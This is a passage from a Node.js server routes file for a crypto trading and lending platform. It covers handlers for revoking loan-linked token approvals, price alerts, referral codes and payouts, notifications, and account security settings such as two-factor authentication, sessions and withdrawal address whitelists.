    if (lockedLoan) fail(423, `This approval secures loan #${lockedLoan}. It can't be revoked in ${pName} until the loan is repaid.`);
    const { signature, simulated } = sigOrSim(c.body);
    q.run('UPDATE approvals SET revoked_at = ? WHERE id = ?', now(), a.id);
    recordTx(u.id, { type: 'Approval', token: a.token, amount: 0, status: simulated || a.family !== 'solana' ? 'confirmed' : 'confirming', confirmations: simulated ? 32 : 0, signature, simulated, note: `Revoked ${a.spender}` });
    // revoking a loan-collection approval is a risk signal for any open loan it secured
    if (/loan collection/i.test(a.spender)) {
      const L = require('../loans');
      for (const d of q.all("SELECT d.*, l.status ls FROM loan_delegations d JOIN loans l ON l.id = d.loan_id WHERE d.user_id = ? AND LOWER(d.owner) = LOWER(?) AND d.token = ? AND d.network = ? AND d.status = 'confirmed'", u.id, a.owner || '', a.token, a.network)) {
        q.run("UPDATE loan_delegations SET status = 'revoked', checked_at = ? WHERE id = ?", now(), d.id);
        if (['approved', 'disbursed', 'defaulted'].includes(d.ls)) L.flag(q.get('SELECT * FROM loans WHERE id = ?', d.loan_id), `Borrower revoked the ${a.token} collection approval on ${a.network}`);
      }
      L.creditScore(u.id);
    }
    S.audit(u.id, 'approval.revoke', a.id, null, c.req);
    return { ok: true };
  });

  /* loans → server/routes/loans.js */

  /* ---------------- price alerts ---------------- */
  r.get('/api/alerts', (c) => { const u = S.requireUser(c); return { rows: q.all('SELECT * FROM price_alerts WHERE user_id = ? ORDER BY active DESC, created_at DESC LIMIT 100', u.id) }; });
  r.post('/api/alerts', (c) => {
    const u = S.requireUser(c);
    const token = str(c.body.token, 10).toUpperCase(); if (!market.exists(token)) fail(400, 'Unknown token');
    const dir = c.body.direction === 'below' ? 'below' : 'above';
    const price = num(c.body.price, 1e-12, 1e9, 'Price');
    if (q.val('SELECT COUNT(*) FROM price_alerts WHERE user_id = ? AND active = 1', u.id) >= 50) fail(400, 'Alert limit reached');
    const id = q.run('INSERT INTO price_alerts(user_id, token, direction, price, email, created_at) VALUES(?,?,?,?,?,?)', u.id, token, dir, price, c.body.email ? 1 : 0, now()).id;
    return { id };
  });
  r.del('/api/alerts/:id', (c) => { const u = S.requireUser(c); q.run('DELETE FROM price_alerts WHERE id = ? AND user_id = ?', c.params.id, u.id); return { ok: true }; });

  /* ---------------- referrals ---------------- */
  r.get('/api/referrals', (c) => {
    const u = S.requireUser(c);
    const codes = q.all("SELECT * FROM invites WHERE kind = 'referral' AND created_by = ? ORDER BY created_at DESC", u.id);
    const total = codes.reduce((a, x) => a + x.uses, 0);
    const R = require('../referrals');
    const converted = R.usesFor(u.id);
    const cur = R.tierFor(converted);
    const next = R.TIERS.find((t) => converted < t.at);
    const pay = R.payable(u.id);
    return {
      codes, total, converted,
      tiers: R.TIERS.map((t) => ({ name: t.name, at: t.at, pct: t.pct, rateBps: t.rateBps, perk: t.perk, reached: converted >= t.at, current: !!cur && cur.name === t.name })),
      next: next ? { name: next.name, at: next.at } : null,
      rate: R.rateFor(converted), rateBps: R.rateBpsFor(converted), maxCodes: getSettings().referral_max_codes,
      earned: q.val("SELECT COALESCE(SUM(amount),0) FROM referral_commissions WHERE referrer_id = ? AND status != 'void'", u.id) || 0,
      payable: pay.total, payableCount: pay.n, minPayout: getSettings().referral_min_payout,
      commissions: q.all('SELECT source_type as kind, basis_amount, rate_bps, amount, status, created_at, settled_at FROM referral_commissions WHERE referrer_id = ? ORDER BY id DESC LIMIT 100', u.id)
    };
  });
  r.post('/api/referrals/payout', (c) => {
    const u = S.requireUser(c);
    try { const r2 = require('../referrals').payout(u.id); S.audit(u.id, 'referral.payout', null, r2, c.req); return r2; }
    catch (e) { fail(e.status || 400, e.message); }
  });
  r.post('/api/referrals/codes', (c) => {
    const u = S.requireUser(c); const s = getSettings();
    if (q.val("SELECT COUNT(*) FROM invites WHERE kind = 'referral' AND created_by = ? AND active = 1", u.id) >= s.referral_max_codes) fail(400, `You can have up to ${s.referral_max_codes} active codes`);
    const A = 'ABCDEFGHJKMNPQRSTUVWXYZ23456789';
    let code; do { code = 'NECTRA-' + Array.from({ length: 4 }, () => A[crypto.randomInt(A.length)]).join(''); } while (q.get('SELECT 1 FROM invites WHERE code = ?', code));
    q.run('INSERT INTO invites(code, kind, created_by, max_uses, created_at) VALUES(?,?,?,?,?)', code, 'referral', u.id, s.referral_code_uses, now());
    return { code };
  });

  /* ---------------- notifications ---------------- */
  r.get('/api/notifications', (c) => { const u = S.requireUser(c); return { rows: q.all('SELECT * FROM notifications WHERE user_id = ? ORDER BY created_at DESC LIMIT 200', u.id) }; });
  r.post('/api/notifications/:id/read', (c) => { const u = S.requireUser(c); q.run('UPDATE notifications SET unread = 0 WHERE id = ? AND user_id = ?', c.params.id, u.id); return { ok: true }; });
  r.post('/api/notifications/read-all', (c) => { const u = S.requireUser(c); q.run('UPDATE notifications SET unread = 0 WHERE user_id = ?', u.id); return { ok: true }; });
  r.get('/api/insights', (c) => { const u = S.requireUser(c); return { rows: q.all('SELECT * FROM insights WHERE user_id = ? OR user_id IS NULL ORDER BY created_at DESC LIMIT 10', u.id) }; });

  /* ---------------- settings & security ---------------- */
  r.patch('/api/me/profile', (c) => {
    const u = S.requireUser(c);
    const name = str(c.body.name, 40) || u.name;
    let email = str(c.body.email, 200) || u.email, devCode;
    if (email && email !== u.email) {
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) fail(400, 'Enter a valid email address');
      if (q.get('SELECT id FROM users WHERE email = ? AND id != ?', email, u.id)) fail(409, 'That email is already in use');
      q.run('UPDATE users SET email = ?, email_verified = 0 WHERE id = ?', email, u.id);
      const code = S.issueCode({ userId: u.id, purpose: 'verify' });
      const pName = getSettings().platform_name || 'NECTRA';
      sendMail(email, `Verify your new ${pName} email`, `Your verification code is ${code}.`, u);
      if (getSettings().demo_mode) devCode = code;
      if (u.email) sendMail(u.email, `Your ${pName} email was changed`, `Your account email was changed to ${email}. If this wasn’t you, contact support immediately.`, u);
    }
    q.run('UPDATE users SET name = ? WHERE id = ?', name, u.id);
    S.audit(u.id, 'user.profile', u.id, { emailChanged: email !== u.email }, c.req);
    return { user: publicUser(q.get('SELECT * FROM users WHERE id = ?', u.id)), reverify: email !== u.email, devCode };
  });
  r.post('/api/me/password', (c) => {
    const u = S.requireUser(c);
    if (u.pw_hash && !S.verifyPassword(String(c.body.current || ''), u.pw_hash)) fail(400, 'Current password is incorrect');
    const e = S.passwordProblems(c.body.password); if (e) fail(400, e);
    q.run('UPDATE users SET pw_hash = ? WHERE id = ?', S.hashPassword(c.body.password), u.id);
    q.run('DELETE FROM sessions WHERE user_id = ? AND id != ?', u.id, c.auth.session.id);
    notify(u.id, 'security', 'Password changed', 'Other sessions were signed out.', 'settings.html#security');
    return { ok: true };
  });
  r.post('/api/me/2fa/setup', (c) => {
    const u = S.requireUser(c);
    if (u.totp_enabled) fail(400, '2FA is already enabled');
    const secret = S.newTotpSecret();
    q.run('UPDATE users SET totp_pending = ? WHERE id = ?', secret, u.id);
    const pName = getSettings().platform_name || 'NECTRA';
    const label = encodeURIComponent(pName + ':' + (u.email || u.wallet_login.slice(0, 8)));
    return { secret, otpauth: `otpauth://totp/${label}?secret=${secret}&issuer=${encodeURIComponent(pName)}&digits=6&period=30` };
  });
  r.post('/api/me/2fa/enable', (c) => {
    const u = S.requireUser(c);
    if (!u.totp_pending || !S.verifyTotp(u.totp_pending, c.body.code)) fail(400, 'Incorrect code — check your authenticator app’s clock');
    q.run('UPDATE users SET totp_secret = totp_pending, totp_pending = NULL, totp_enabled = 1 WHERE id = ?', u.id);
    S.audit(u.id, 'security.2fa_on', u.id, null, c.req);
    notify(u.id, 'security', 'Two-factor authentication enabled', 'Withdrawals and sign-ins now require your authenticator code.', 'settings.html#security');
    return { ok: true };
  });
  r.post('/api/me/2fa/disable', (c) => {
    const u = S.requireUser(c);
    if (!S.verifyTotp(u.totp_secret, c.body.code)) fail(400, 'Incorrect code');
    q.run('UPDATE users SET totp_secret = NULL, totp_enabled = 0 WHERE id = ?', u.id);
    S.audit(u.id, 'security.2fa_off', u.id, null, c.req);
    notify(u.id, 'security', 'Two-factor authentication disabled', 'If this wasn’t you, secure your account now.', 'settings.html#security');
    return { ok: true };
  });
  r.patch('/api/me/anti-phishing', (c) => {
    const u = S.requireUser(c); const v = str(c.body.code, 16).toUpperCase().replace(/[^A-Z0-9-]/g, '');
    if (v.length < 4) fail(400, 'Use 4–16 letters, numbers or dashes');
    q.run('UPDATE users SET anti_phishing = ? WHERE id = ?', v, u.id); return { code: v };
  });
  r.get('/api/me/sessions', (c) => {
    const u = S.requireUser(c);
    return { rows: q.all('SELECT id, user_agent, ip, created_at, last_seen_at FROM sessions WHERE user_id = ? AND expires_at > ? ORDER BY last_seen_at DESC', u.id, now()).map((s) => ({ ...s, current: s.id === c.auth.session.id })) };
  });
  r.del('/api/me/sessions/:id', (c) => { const u = S.requireUser(c); q.run('DELETE FROM sessions WHERE id = ? AND user_id = ?', c.params.id, u.id); S.audit(u.id, 'security.session_revoke', c.params.id, null, c.req); return { ok: true }; });
  r.post('/api/me/sessions/revoke-others', (c) => { const u = S.requireUser(c); const n = q.run('DELETE FROM sessions WHERE user_id = ? AND id != ?', u.id, c.auth.session.id).changes; return { revoked: n }; });
  r.get('/api/address-book', (c) => { const u = S.requireUser(c); return { rows: q.all('SELECT * FROM address_book WHERE user_id = ? ORDER BY created_at', u.id), whitelistOnly: !!u.whitelist_only }; });
  r.post('/api/address-book', (c) => {
    const u = S.requireUser(c);
    const address = str(c.body.address, 64); if (!chain.isSolAddress(address)) fail(400, 'Not a valid Solana address');
    if (q.get('SELECT id FROM address_book WHERE user_id = ? AND address = ?', u.id, address)) fail(409, 'Address already saved');
    const hold = getSettings().withdraw_hold_hours * 3600e3;
    const id = q.run('INSERT INTO address_book(user_id, label, address, whitelisted, unlock_at, created_at) VALUES(?,?,?,?,?,?)', u.id, str(c.body.label, 32) || 'Saved address', address, c.body.whitelisted === false ? 0 : 1, now() + hold, now()).id;
    notify(u.id, 'security', 'Withdrawal address whitelisted', `${address.slice(0, 4)}…${address.slice(-4)} unlocks in ${getSettings().withdraw_hold_hours}h.`, 'settings.html#security');
    S.audit(u.id, 'security.whitelist_add', id, { address }, c.req);
    return { id };
  });
  r.del('/api/address-book/:id', (c) => { const u = S.requireUser(c); q.run('DELETE FROM address_book WHERE id = ? AND user_id = ?', c.params.id, u.id); return { ok: true }; });
  r.patch('/api/me/whitelist-only', (c) => { const u = S.requireUser(c); q.run('UPDATE users SET whitelist_only = ? WHERE id = ?', c.body.on ? 1 : 0, u.id); S.audit(u.id, 'security.whitelist_only', u.id, { on: !!c.body.on }, c.req); return { on: !!c.body.on }; });
  r.patch('/api/me/risk', (c) => {
    const u = S.requireUser(c);
    const risk = { ...J(u.risk), maxDailyLoss: num(c.body.maxDailyLoss, 1, 50, 'Max daily loss'), maxPosition: num(c.body.maxPosition, 50, 1e7, 'Max position'), maxBots: Math.round(num(c.body.maxBots, 1, 50, 'Max bots')), requireLiveConfirm: c.body.requireLiveConfirm !== false };
    if (c.body.guardDropPct === null) delete risk.guardDropPct;
    q.run('UPDATE users SET risk = ? WHERE id = ?', JSON.stringify(risk), u.id);
    return { risk };
  });
  r.patch('/api/me/prefs', (c) => {
    const u = S.requireUser(c);
    const p = { ...J(u.prefs) };
    if (['dark', 'light'].includes(c.body.theme)) p.theme = c.body.theme;
    if (['USD', 'EUR', 'SOL'].includes(c.body.ccy)) p.ccy = c.body.ccy;
    if (c.body.lang) p.lang = str(c.body.lang, 20);
    if (c.body.emailNotif != null) p.emailNotif = !!c.body.emailNotif;
    if (c.body.pushNotif != null) p.pushNotif = !!c.body.pushNotif;
    q.run('UPDATE users SET prefs = ? WHERE id = ?', JSON.stringify(p), u.id);
    return { prefs: p };
  });
};
module.exports.statusPayload = statusPayload;
module.exports.loanView = loanView;
module.exports.txRow = txRow;
module.exports.refreshWalletBalance = refreshWalletBalance;
module.exports.walletRow = walletRow;
